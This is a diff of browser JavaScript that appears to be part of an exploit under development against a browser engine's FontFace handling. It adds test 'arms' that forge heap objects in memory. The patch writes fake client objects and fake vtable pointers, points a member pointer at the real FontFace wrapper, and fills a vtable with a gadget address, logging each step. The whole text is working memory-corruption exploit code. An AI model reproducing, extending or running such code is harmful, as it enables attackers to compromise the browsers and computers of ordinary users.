@@ -58,7 +58,7 @@ try{
       var S=MBUF;
       var hitBuf=bufs[0][0];
 
-      var ARM=(function(){var m=/[?&]arm=(born|weak|d0|d1)/.exec(location.search);return m?m[1]:'born';})();
+      var ARM=(function(){var m=/[?&]arm=(born|weak|d0|d0a|d0b|d1)/.exec(location.search);return m?m[1]:'born';})();
       bs('V29-ARM='+ARM);
 
       /* ---- STEP 1: ALL readAt FIRST ---- */
@@ -89,7 +89,8 @@ try{
       /* impl = real L2 byte-copy; m_ptr per arm */
       for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
       if(ARM==='weak')        dvSetBig(sv,0x08,0n);        /* null client -> entry removed */
-      else if(ARM==='d0'||ARM==='d1')dvSetBig(sv,0x08,S+0x50n);  /* fake client */
+      else if(ARM==='d0a')    dvSetBig(sv,0x08,FB);         /* the REAL FontFace wrapper -> real vtable, real everything */
+      else if(ARM==='d0'||ARM==='d1'||ARM==='d0b')dvSetBig(sv,0x08,S+0x50n); /* fake client */
       else                    dvSetBig(sv,0x08,0n);        /* born: unreferenced anyway */
       var implRcBefore=sv.getUint32(0x00,true);
       bs('V29-IMPL-rc='+implRcBefore+'-m_ptr='+hex(dvGetBig(sv,0x08)));
@@ -109,12 +110,17 @@ try{
         dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
       }
 
-      /* client = real wrapper byte-copy (used by d0/d1; unreferenced otherwise) */
+      /* client = real wrapper byte-copy (used by d0/d0b/d1; unreferenced otherwise)
+       * d0a uses the REAL wrapper at FB (m_ptr=FB) - no copy involved.
+       * d0b keeps the copy's +0x00 = the REAL vtable pointer (UNPATCHED)
+       *      -> dispatches run the REAL FontFace methods on the fake client. */
       for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
-      dvSetBig(sv,0x50+0x00,S+0x90n);              /* client vtable -> fake */
+      if(ARM==='d0'||ARM==='d1')dvSetBig(sv,0x50+0x00,S+0x90n); /* fake vtable */
+      /* d0b: leave client+0x00 = the real VP (from fbRaw) */
       /* client+0x18 promise deliberately kept = the REAL promise (fbRaw copy) */
       var clientPromise=dvGetBig(sv,0x50+0x18);
       bs('V29-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH'));
+      if(ARM==='d0b')bs('V29-CLIENT-VT-REAL='+hex(dvGetBig(sv,0x50)));
 
       /* vtable */
       for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
